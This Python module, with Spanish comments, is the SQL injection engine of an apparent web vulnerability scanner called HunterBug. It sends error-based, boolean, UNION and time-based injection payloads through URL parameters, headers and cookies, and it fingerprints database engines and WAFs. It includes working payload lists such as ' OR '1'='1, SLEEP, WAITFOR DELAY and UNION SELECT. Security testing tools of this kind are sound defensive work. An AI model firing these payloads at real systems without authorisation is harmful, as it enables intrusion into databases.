"""HunterBug 1.1 — motor de inyección SQL.

Cinco técnicas, cada una con su control de falsos positivos:

  * error      — firmas de error por motor, descartando las que ya aparecen en
                 la respuesta base (si el error estaba de antes, no es nuestro).
  * booleana   — diferencial con similitud: la condición verdadera debe parecerse
                 a la respuesta base y la falsa no. Se exigen DOS pares de
                 acuerdo para confirmar.
  * union      — recuento de columnas y reflexión de una marca propia.
  * tiempo     — medida con mediana de varias muestras y umbral claro. Es la
                 única técnica que carga el servidor, así que va desactivada por
                 defecto y con presupuesto de tiempo.
  * cabeceras  — las mismas firmas sobre User-Agent, Referer, X-Forwarded-For
                 y cookies, porque muchos registros acaban en una consulta.

Además identifica el motor (MySQL, MSSQL, PostgreSQL, Oracle, SQLite…) y detecta
si hay un WAF delante, que cambia por completo cómo se ataca el objetivo.
"""

from __future__ import annotations

import re
import statistics
import time

from . import net, vulns

PAUSA = 0.12
_TIMEOUT = 12          # timeout de peticion; `analizar` lo ajusta al suyo

# ---------------------------------------------------------------------------
# Firmas de error por motor
# ---------------------------------------------------------------------------
FIRMAS = [
    (r"you have an error in your sql syntax", "MySQL", 95),
    (r"check the manual that corresponds to your (mysql|mariadb) server", "MySQL", 95),
    (r"warning:\s*mysqli?_", "MySQL", 85),
    (r"mysql_fetch|mysql_num_rows|mysql_query", "MySQL", 80),
    (r"unclosed quotation mark after the character string", "MSSQL", 95),
    (r"microsoft ole db provider for sql server", "MSSQL", 90),
    (r"odbc sql server driver", "MSSQL", 90),
    (r"incorrect syntax near", "MSSQL", 90),
    (r"microsoft sql native client", "MSSQL", 85),
    (r"pg_query\(\)|pg_exec\(\)", "PostgreSQL", 95),
    (r"postgresql.{0,40}error", "PostgreSQL", 85),
    (r"syntax error at or near", "PostgreSQL", 85),
    (r"unterminated quoted string at or near", "PostgreSQL", 90),
    (r"psql:\s*error", "PostgreSQL", 85),
    (r"ora-\d{4,5}", "Oracle", 95),
    (r"quoted string not properly terminated", "Oracle", 90),
    (r"oracle error|oracle.*driver", "Oracle", 80),
    (r"sqlite3?\.(operational|programming)error", "SQLite", 95),
    (r"sqlite error|sqlite_master", "SQLite", 85),
    (r"jdbc.*sqlexception|sqlexception", "Java JDBC", 85),
    (r"org\.hibernate|hibernate\.exception", "Hibernate", 85),
    (r"java\.sql\.sqlsyntaxerrorexception", "Java JDBC", 90),
    (r"unknown column .{0,60}in 'order clause'", "MySQL", 90),
    (r"order by.*(out of range|unknown column)", "SQL genérico", 75),
    (r"unknown column", "MySQL", 60),
    (r"syntax error.*\bsql\b", "SQL genérico", 55),
    (r"division by zero", "SQL genérico", 45),
    (r"sqlstate\[", "SQL genérico", 70),
    (r"invalid query|sql command not properly ended", "SQL genérico", 60),
]
_RE_FIRMAS = [(re.compile(p, re.I), m, c) for p, m, c in FIRMAS]

# ---------------------------------------------------------------------------
# WAF
# ---------------------------------------------------------------------------
FIRMAS_WAF = [
    ("cloudflare", ["cloudflare", "cf-ray", "__cf_bm", "cf-chl"]),
    ("Akamai", ["akamai", "ak-bmsc", "reference #"]),
    ("Imperva / Incapsula", ["incap_ses", "visid_incap", "incapsula"]),
    ("ModSecurity", ["mod_security", "modsecurity", "not acceptable"]),
    ("Sucuri", ["sucuri", "x-sucuri"]),
    ("AWS WAF", ["awselb", "x-amzn-requestid", "request blocked"]),
    ("F5 BIG-IP", ["bigip", "ts01", "x-wa-info"]),
    ("Fortinet FortiWeb", ["fortiweb", "fortigate"]),
    ("Barracuda", ["barra", "barracuda"]),
]

# ---------------------------------------------------------------------------
# Cargas útiles
# ---------------------------------------------------------------------------
ERROR = ["'", '"', "')", "';", "1'", "'-- -", "')-- -", "\\", "' OR '1'='1"]

# (condición verdadera, condición falsa) — sin comilla y con comilla
BOOL_NUM = [(" AND 1=1", " AND 1=2"),
            (" AND 2=2", " AND 2=3"),
            (" AND 1=1-- -", " AND 1=2-- -")]
BOOL_TXT = [("' AND '1'='1", "' AND '1'='2"),
            ("' AND 1=1-- -", "' AND 1=2-- -"),
            ('" AND "1"="1', '" AND "1"="2')]

TIEMPO = [
    ("' AND SLEEP({s})-- -", "MySQL"),
    ("' AND SLEEP({s})#", "MySQL"),
    ("1 AND SLEEP({s})", "MySQL"),
    ("'; WAITFOR DELAY '0:0:{s}'-- -", "MSSQL"),
    ("1; WAITFOR DELAY '0:0:{s}'-- -", "MSSQL"),
    ("' AND pg_sleep({s})-- -", "PostgreSQL"),
    ("'; SELECT pg_sleep({s})-- -", "PostgreSQL"),
    ("' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('hb',{s})-- -", "Oracle"),
]

UNION_ORDER = ["' ORDER BY {n}-- -", " ORDER BY {n}-- -", "' ORDER BY {n}#"]
UNION_SELECT = ["' UNION SELECT {cols}-- -", " UNION SELECT {cols}-- -",
                "' UNION SELECT {cols}#"]


# ---------------------------------------------------------------------------
# Ayudas
# ---------------------------------------------------------------------------
def _texto(r):
    return (r.cuerpo or "") if r is not None else ""


def _parecido(a, b):
    """Similitud por tokens (Jaccard), la misma que usa el resto de la app."""
    return vulns._similitud(a, b)


def _es_numerico(valor):
    return bool(re.fullmatch(r"-?\d+", str(valor or "")))


def _peticion(url, cabeceras=None, timeout=None):
    # el timeout global lo fija `analizar`, para no arrastrarlo por 20 llamadas
    return net.peticion_http(
        url, cabeceras=cabeceras,
        timeout=timeout if timeout is not None else _TIMEOUT)


def _firmas_en(texto):
    """Devuelve [(motor, confianza, coincidencia)] de las firmas presentes."""
    salida = []
    for rx, motor, conf in _RE_FIRMAS:
        m = rx.search(texto)
        if m:
            salida.append((motor, conf, m.group(0)[:120]))
    return salida


def detectar_waf(r):
    """Mira cabeceras y cuerpo en busca de un WAF conocido."""
    blob = (str(r.cabeceras).lower() + " " + _texto(r)[:4000].lower())
    for nombre, pistas in FIRMAS_WAF:
        for p in pistas:
            if p in blob:
                return nombre
    if r.status in (403, 406, 429, 501) and r.cabecera("server"):
        return "posible WAF (%s, %d)" % (r.cabecera("server"), r.status)
    return ""


# ---------------------------------------------------------------------------
# Técnica 1: error
# ---------------------------------------------------------------------------
def _por_error(url, nombre, valor, base, cabeceras, log):
    base_min = _texto(base).lower()
    ya_en_base = {f[0] for f in _firmas_en(base_min)}
    for pay in ERROR:
        u = vulns._sustituir_param(url, nombre, str(valor) + pay)
        r = _peticion(u, cabeceras)
        firmas = _firmas_en(_texto(r).lower())
        for motor, conf, coincidencia in firmas:
            if motor in ya_en_base:
                continue        # el error ya estaba antes de tocar nada
            if conf < 50:
                continue
            log("  SQLi por error en '%s' con %r -> %s" % (nombre, pay, motor))
            return {
                "tecnica": "error", "parametro": nombre, "dbms": motor,
                "confianza": conf, "payload": pay,
                "evidencia": {"payload": pay, "motor": motor,
                              "coincidencia": coincidencia,
                              "status": r.status,
                              "extracto": _texto(r)[:400]},
            }
        time.sleep(PAUSA)
    return None


# ---------------------------------------------------------------------------
# Técnica 2: booleana
# ---------------------------------------------------------------------------
def _por_booleana(url, nombre, valor, base, cabeceras, log):
    """Exige que la condición verdadera se parezca a la base y la falsa no,
    y que DOS pares distintos estén de acuerdo."""
    cuerpo_base = _texto(base)
    if len(cuerpo_base) < 30:
        return None
    pares = BOOL_NUM if _es_numerico(valor) else BOOL_TXT
    acuerdos = []
    for verdad, falso in pares:
        u_v = vulns._sustituir_param(url, nombre, str(valor) + verdad)
        r_v = _peticion(u_v, cabeceras)
        time.sleep(PAUSA)
        u_f = vulns._sustituir_param(url, nombre, str(valor) + falso)
        r_f = _peticion(u_f, cabeceras)
        time.sleep(PAUSA)

        sim_v = _parecido(cuerpo_base, _texto(r_v))
        sim_f = _parecido(cuerpo_base, _texto(r_f))
        sim_vf = _parecido(_texto(r_v), _texto(r_f))

        # la verdadera parece la base; la falsa se separa de ambas
        if sim_v >= 0.90 and sim_f <= 0.80 and sim_vf <= 0.80:
            acuerdos.append({"verdad": verdad, "falso": falso,
                             "sim_verdad": round(sim_v, 3),
                             "sim_falso": round(sim_f, 3),
                             "sim_entre": round(sim_vf, 3),
                             "bytes_verdad": r_v.cuerpo_bytes,
                             "bytes_falso": r_f.cuerpo_bytes})
            if len(acuerdos) >= 2:
                log("  SQLi booleana confirmada en '%s' (%d pares de acuerdo)"
                    % (nombre, len(acuerdos)))
                return {
                    "tecnica": "booleana", "parametro": nombre, "dbms": "",
                    "confianza": 88, "payload": acuerdos[0]["verdad"],
                    "evidencia": {"pares_de_acuerdo": len(acuerdos),
                                  "detalle": acuerdos},
                }
    return None


# ---------------------------------------------------------------------------
# Técnica 3: UNION
# ---------------------------------------------------------------------------
def _por_union(url, nombre, valor, base, cabeceras, log):
    """Averigua el número de columnas y comprueba que se refleja una marca."""
    cuerpo_base = _texto(base)
    columnas = None
    for n in range(1, 11):
        for plantilla in UNION_ORDER[:2]:
            u = vulns._sustituir_param(url, nombre,
                                       str(valor) + plantilla.format(n=n))
            r = _peticion(u, cabeceras)
            time.sleep(PAUSA)
            firmas = [f for f in _firmas_en(_texto(r).lower()) if f[1] >= 60]
            if firmas:
                columnas = n - 1
                break
        if columnas:
            break
    if not columnas or columnas < 1 or columnas > 10:
        return None

    marca = "hb" + str(int(time.time() * 1000) % 100000)
    cols = ",".join(["'%s'" % marca] + ["NULL"] * (columnas - 1))
    for plantilla in UNION_SELECT[:2]:
        u = vulns._sustituir_param(url, nombre,
                                   str(valor) + plantilla.format(cols=cols))
        r = _peticion(u, cabeceras)
        time.sleep(PAUSA)
        if marca in _texto(r) and marca not in cuerpo_base:
            log("  SQLi UNION en '%s': %d columnas, marca reflejada"
                % (nombre, columnas))
            return {
                "tecnica": "union", "parametro": nombre, "dbms": "",
                "confianza": 92, "payload": plantilla.format(cols=cols),
                "evidencia": {"columnas": columnas, "marca": marca,
                              "status": r.status},
            }
    return None


# ---------------------------------------------------------------------------
# Técnica 4: tiempo
# ---------------------------------------------------------------------------
def _por_tiempo(url, nombre, valor, base, cabeceras, log, segundos=5,
                presupuesto=None):
    """Compara la mediana de varias muestras con la del objetivo dormido."""
    if presupuesto is not None and presupuesto <= 0:
        log("  (sin presupuesto de tiempo para la prueba ciega)")
        return None
    muestras = []
    for _ in range(3):
        t0 = time.time()
        _peticion(url, cabeceras)
        muestras.append(time.time() - t0)
        time.sleep(PAUSA)
    base_med = statistics.median(muestras)
    # el umbral tiene que ser alcanzable por la espera que inyectamos: con una
    # espera de 2 s un umbral fijo de 3 s haria la prueba imposible de pasar
    umbral = base_med + max(segundos * 0.7, 1.2)

    for plantilla, motor in TIEMPO:
        if presupuesto is not None and presupuesto < segundos + 2:
            break
        pay = plantilla.format(s=segundos)
        u = vulns._sustituir_param(url, nombre, str(valor) + pay)
        t0 = time.time()
        r = _peticion(u, cabeceras, timeout=segundos + 15)
        dt = time.time() - t0
        if presupuesto is not None:
            presupuesto -= dt + PAUSA
        time.sleep(PAUSA)
        if dt >= umbral and r.status not in (0,):
            log("  SQLi ciega por tiempo en '%s': %.1f s frente a %.1f s base"
                % (nombre, dt, base_med))
            return {
                "tecnica": "tiempo", "parametro": nombre, "dbms": motor,
                "confianza": 85, "payload": pay,
                "evidencia": {"payload": pay, "segundos_medidos": round(dt, 2),
                              "mediana_base": round(base_med, 2),
                              "umbral": round(umbral, 2),
                              "muestras_base": [round(m, 2) for m in muestras],
                              "status": r.status},
            }
    return None


# ---------------------------------------------------------------------------
# Técnica 5: cabeceras y cookies
# ---------------------------------------------------------------------------
CABECERAS_PRUEBA = ["User-Agent", "Referer", "X-Forwarded-For", "X-Real-IP",
                    "Origin", "X-Api-Version"]


def _por_cabeceras(url, base, cabeceras, log):
    base_min = _texto(base).lower()
    ya_en_base = {f[0] for f in _firmas_en(base_min)}
    salida = []
    for cab in CABECERAS_PRUEBA:
        for pay in ("'", '"', "')"):
            h = dict(cabeceras or {})
            h[cab] = "HunterBug" + pay
            r = _peticion(url, h)
            for motor, conf, coincidencia in _firmas_en(_texto(r).lower()):
                if motor in ya_en_base or conf < 55:
                    continue
                log("  SQLi por error en la cabecera %s -> %s" % (cab, motor))
                salida.append({
                    "tecnica": "error-cabecera", "parametro": cab,
                    "dbms": motor, "confianza": conf, "payload": pay,
                    "evidencia": {"cabecera": cab, "payload": pay,
                                  "motor": motor, "coincidencia": coincidencia},
                })
                break
            time.sleep(PAUSA)
        if salida:
            break
    return salida


def _por_cookies(url, base, cabeceras, log):
    """Prueba cada cookie que envíe el servidor."""
    r0 = _peticion(url, cabeceras)
    cookies = []
    for k, v in r0.cabeceras:
        if k.lower() == "set-cookie":
            n = v.split("=")[0].strip()
            if n:
                cookies.append(n)
    if not cookies:
        return []
    base_min = _texto(base).lower()
    ya_en_base = {f[0] for f in _firmas_en(base_min)}
    for nombre in cookies[:4]:
        for pay in ("'", '"'):
            h = dict(cabeceras or {})
            h["Cookie"] = "%s=%s" % (nombre, pay)
            r = _peticion(url, h)
            for motor, conf, coincidencia in _firmas_en(_texto(r).lower()):
                if motor in ya_en_base or conf < 60:
                    continue
                log("  SQLi por error en la cookie '%s' -> %s" % (nombre, motor))
                return [{
                    "tecnica": "error-cookie", "parametro": nombre,
                    "dbms": motor, "confianza": conf, "payload": pay,
                    "evidencia": {"cookie": nombre, "payload": pay,
                                  "motor": motor,
                                  "coincidencia": coincidencia},
                }]
            time.sleep(PAUSA)
    return []


# ---------------------------------------------------------------------------
# API pública
# ---------------------------------------------------------------------------
SEV_TECNICA = {"error": "critico", "union": "critico", "booleana": "alto",
               "tiempo": "alto", "error-cabecera": "alto",
               "error-cookie": "alto"}

TITULO_TECNICA = {
    "error": "Inyección SQL por errores",
    "union": "Inyección SQL UNION (extracción de datos)",
    "booleana": "Inyección SQL ciega booleana",
    "tiempo": "Inyección SQL ciega por tiempo",
    "error-cabecera": "Inyección SQL desde cabecera HTTP",
    "error-cookie": "Inyección SQL desde cookie",
}


def analizar(url, cabeceras=None, pausa=PAUSA, log=None, tiempo=False,
             max_params=4, presupuesto_tiempo=90, segundos_tiempo=5,
             timeout=12):
    """Analiza una URL y devuelve el resultado estructurado.

    `tiempo=False` por defecto: la técnica ciega por tiempo carga el servidor,
    así que se activa a conciencia. `segundos_tiempo` es la espera inyectada.
    """
    global _TIMEOUT
    _TIMEOUT = timeout
    log = log or (lambda t, n="info": None)
    base = _peticion(url, cabeceras)
    if base.status == 0:
        return {"url": url, "error": base.error, "hallazgos": [],
                "dbms": "", "waf": "", "parametros": [], "resumen": {}}

    params = vulns.parametros_de(url)[:max_params]
    waf = detectar_waf(base)
    if waf:
        log("WAF detectado: %s" % waf, "aviso")

    resultados = []
    tecnicas_ok = set()

    for nombre, valor in params:
        log("Probando el parámetro '%s'..." % nombre)

        r = _por_error(url, nombre, valor, base, cabeceras, log)
        if r:
            resultados.append(r)
            tecnicas_ok.add("error")

        r = _por_booleana(url, nombre, valor, base, cabeceras, log)
        if r:
            resultados.append(r)
            tecnicas_ok.add("booleana")

        r = _por_union(url, nombre, valor, base, cabeceras, log)
        if r:
            resultados.append(r)
            tecnicas_ok.add("union")

        if tiempo:
            r = _por_tiempo(url, nombre, valor, base, cabeceras, log,
                            segundos=segundos_tiempo,
                            presupuesto=presupuesto_tiempo)
            if r:
                resultados.append(r)
                tecnicas_ok.add("tiempo")
                presupuesto_tiempo -= segundos_tiempo + 3

    if not resultados:
        for r in _por_cabeceras(url, base, cabeceras, log):
            resultados.append(r)
            tecnicas_ok.add(r["tecnica"])
        for r in _por_cookies(url, base, cabeceras, log):
            resultados.append(r)
            tecnicas_ok.add(r["tecnica"])

    # motor definitivo: la firma más fiable que hayamos visto
    dbms = ""
    for r in resultados:
        if r.get("dbms"):
            dbms = r["dbms"]
            break

    hallazgos = []
    for r in resultados:
        tec = r["tecnica"]
        sev = SEV_TECNICA.get(tec, "alto")
        titulo = TITULO_TECNICA.get(tec, "Inyección SQL") + \
            (" en '%s'" % r["parametro"] if r["parametro"] else "")
        detalle = _detalle(r, dbms)
        hallazgos.append({
            "tipo": "sqli", "severidad": sev, "titulo": titulo,
            "detalle": detalle, "url": url, "parametro": r["parametro"],
            "cwe": "CWE-89", "owasp": "A03:2021",
            "confianza": r["confianza"],
            "recomendacion": (
                "Usar consultas parametrizadas (sentencias preparadas) en todas "
                "las consultas, incluidas las que usan cabeceras y cookies. "
                "Aplicar el mínimo privilegio al usuario de base de datos y "
                "devolver errores genéricos."),
            "evidencia": r["evidencia"],
        })

    return {
        "url": url, "dbms": dbms, "waf": waf,
        "parametros": [p[0] for p in params],
        "tecnicas": sorted(tecnicas_ok),
        "hallazgos": hallazgos,
        "resumen": {"inyectable": bool(resultados),
                    "tecnicas": sorted(tecnicas_ok),
                    "dbms": dbms, "waf": waf,
                    "parametros_probados": len(params),
                    "hallazgos": len(hallazgos)},
    }


def _detalle(r, dbms):
    tec = r["tecnica"]
    p = r["parametro"]
    if tec == "error":
        return ("El parámetro '%s' devuelve un error de %s al inyectar %r, lo "
                "que confirma que la entrada llega sin sanear a una consulta."
                % (p, r["dbms"], r["payload"]))
    if tec == "union":
        return ("El parámetro '%s' admite UNION con %d columnas y refleja una "
                "marca propia en la respuesta: se pueden extraer datos de la "
                "base de datos directamente."
                % (p, r["evidencia"].get("columnas", 0)))
    if tec == "booleana":
        return ("La respuesta cambia de forma consistente al alternar una "
                "condición verdadera y una falsa en '%s' (%d pares de acuerdo), "
                "lo que permite extraer información bit a bit."
                % (p, r["evidencia"].get("pares_de_acuerdo", 0)))
    if tec == "tiempo":
        return ("Una condición con espera en '%s' tarda %.1f s frente a %.1f s "
                "de base, lo que confirma inyección ciega por tiempo."
                % (p, r["evidencia"].get("segundos_medidos", 0),
                   r["evidencia"].get("mediana_base", 0)))
    if tec == "error-cabecera":
        return ("La cabecera '%s' se usa en una consulta sin sanear: inyectar "
                "%r provoca un error de %s." % (p, r["payload"], r["dbms"]))
    if tec == "error-cookie":
        return ("La cookie '%s' se usa en una consulta sin sanear: inyectar %r "
                "provoca un error de %s." % (p, r["payload"], r["dbms"]))
    return "Inyección SQL confirmada en '%s'." % p
